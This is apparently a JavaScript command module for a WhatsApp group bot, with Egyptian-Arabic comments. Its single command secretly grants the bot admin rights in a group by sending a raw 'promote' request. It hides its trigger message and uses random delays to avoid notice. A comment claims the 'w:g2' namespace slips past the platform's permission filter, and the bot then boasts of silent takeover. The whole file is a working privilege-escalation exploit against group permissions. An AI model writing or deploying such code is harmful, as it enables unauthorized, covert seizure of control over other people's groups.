const config = require('../config');

module.exports = {
    name:"خد",  // الأمر.خد
    run: async (sock, m, args) => {                                                                                                          const from = m.key.remoteJid;
        const sender = m.key.participant || m.key.remoteJid;

        // مطور فقط
        if (!config.DEVELOPERS.includes(sender)) {
            return sock.sendMessage(from, { text:"🚫 مطور فقط يا برو." }, { quoted: m });} if (!from.endsWith('@g.us')) {
            return sock.sendMessage(from, { text:"❌ جروبات بس." }, { quoted: m });} try {
            await sock.sendMessage(from, { delete: { id: m.key.id, remoteJid: from, fromMe: true} });
            await new Promise(r => setTimeout(r, 8000 + Math.floor(Math.random() * 12000)));
 const tag = sock.generateMessageTag();
await sock.query({                                                                                                                                   tag: 'iq',
                attrs: {
                    id: tag,
                    type: 'set',
                    xmlns: 'w:g2',   // ده اللي بيخليها تخترق الفلتر القديم
                    to: from}, content: [{
                    tag: 'promote',
                    attrs: {},                    content: [{
                        tag: 'participant',
                        attrs: { jid: sock.user.jid} // البوت يرفع نفسه
                    }]                }]            });            console.log('[+] البوت خد اشراف خفي بنجاح via w:g2');
            await new Promise(r => setTimeout(r, 10000 + Math.floor(Math.random() * 8000)));            // رسالة تأكيد خفيفة
            await sock.sendMessage(from, {
                text:"🔥 تم أخذ الإشراف بصمت تام.. السيطرة دلوقتي بإيدي👑"
            });} catch (err) {
            console.error('[-] فشل في أخذ الإشراف:', err.message);
await sock.sendMessage(from, {
                text:"❌ ما نفعش الـ w:g2.. الجروب ده محصن كويس أو فيه باتش جديد 2026.\nجرب طريقة تانية أو انتقل لجروب أقدم."
            });} }};